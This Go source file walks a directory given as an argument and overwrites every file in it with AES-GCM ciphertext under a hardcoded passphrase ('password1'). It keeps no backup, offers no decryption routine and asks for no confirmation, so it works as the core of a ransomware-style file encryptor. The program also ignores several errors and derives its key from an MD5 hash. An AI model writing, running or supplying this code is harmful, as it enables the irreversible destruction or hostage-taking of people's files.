package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"io"
	"io/ioutil"
	"log"
	"os"
)

func createHash(key string) string {
	// Create a new hash object
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func encrypt(data []byte, passphrase string) []byte {
	// Create a new AES cipher block
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	// Create a new nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	// Encrypt the data
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

func encryptFile(filename string, data []byte, passphrase string) {
	// Encrypt the file content
	f, _ := os.Create(filename)
	defer f.Close()
	f.Write(encrypt(data, passphrase))
}

func main() {
	// Usage example:
	//fmt.Println("Starting the application...")
	//ciphertext := encrypt([]byte("test"), "password")
	//fmt.Printf("Encrypted: %x\n", ciphertext)
	//encryptFile("sample.txt", []byte("foo"), "password1")

	var dir = os.Args[1]
	files, err := ioutil.ReadDir(dir)

	if err != nil {
		log.Fatal(err)
	}

	// Iterate over the files to encrypt
	for i := 0; i < len(files); i++ {
		var filePath = dir + "/" + string(files[i].Name())
		content, err := os.ReadFile(filePath)
		if err != nil {
			log.Fatal(err)
		}
		encryptFile(filePath, []byte(string(content)), "password1")
	}

}
